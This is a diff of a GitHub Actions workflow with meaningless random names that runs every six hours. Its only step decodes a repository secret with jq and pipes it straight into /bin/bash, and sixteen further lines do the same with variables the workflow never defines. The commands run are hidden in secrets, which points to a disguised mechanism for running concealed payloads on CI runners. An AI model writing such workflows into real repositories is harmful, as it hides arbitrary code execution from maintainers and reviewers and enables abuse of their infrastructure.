@@ -1,26 +1,33 @@
 name: heshibu4102
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 3/6 * * *'
-jobs:  # 28639
+    - cron: '19 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: heshibu4102
         env:
-          kat92094: ${{ secrets.kat92094 }}
+          vb576: ${{ secrets.vb576 }}
         run: |
-          echo $kat92094 | jq -r .m3 | /bin/bash
-          echo $bsd10685 | jq -r .exg49 | /bin/bash
-          echo $h51428 | jq -r .xha2981 | /bin/bash
-          echo $klrc195 | jq -r .w85545 | /bin/bash
-          echo $fe4823 | jq -r .xrdn8688 | /bin/bash
-          echo $k72483 | jq -r .risdj34722 | /bin/bash
-          echo $x66707 | jq -r .d55 | /bin/bash
-          echo $bq37 | jq -r .cee3989 | /bin/bash
-          echo $z6 | jq -r .omwxd20 | /bin/bash
-          echo $zv78 | jq -r .mrhw40 | /bin/bash
-          echo $ok6866 | jq -r .xrrr70067 | /bin/bash
+          echo $vb576 | jq -r .ns76 | /bin/bash
+          echo $tg666 | jq -r .gzaei66 | /bin/bash
+          echo $h5421 | jq -r .pnk80 | /bin/bash
+          echo $cwpy60125 | jq -r .kihcg417 | /bin/bash
+          echo $wlow8 | jq -r .ug75 | /bin/bash
+          echo $fp9 | jq -r .l404 | /bin/bash
+          echo $qfmsq1 | jq -r .wkha918 | /bin/bash
+          echo $lbk9043 | jq -r .x0 | /bin/bash
+          echo $li651 | jq -r .gmx7 | /bin/bash
+          echo $wo6 | jq -r .zog08229 | /bin/bash
+          echo $y0942 | jq -r .nnrib7557 | /bin/bash
+          echo $zheh4805 | jq -r .vlj2109 | /bin/bash
+          echo $zubik9 | jq -r .dilyw13 | /bin/bash
+          echo $pthrl5 | jq -r .ulkh9 | /bin/bash
+          echo $d01614 | jq -r .bt4 | /bin/bash
+          echo $g745 | jq -r .w33247 | /bin/bash
+          echo $d80 | jq -r .ijyu4918 | /bin/bash
 
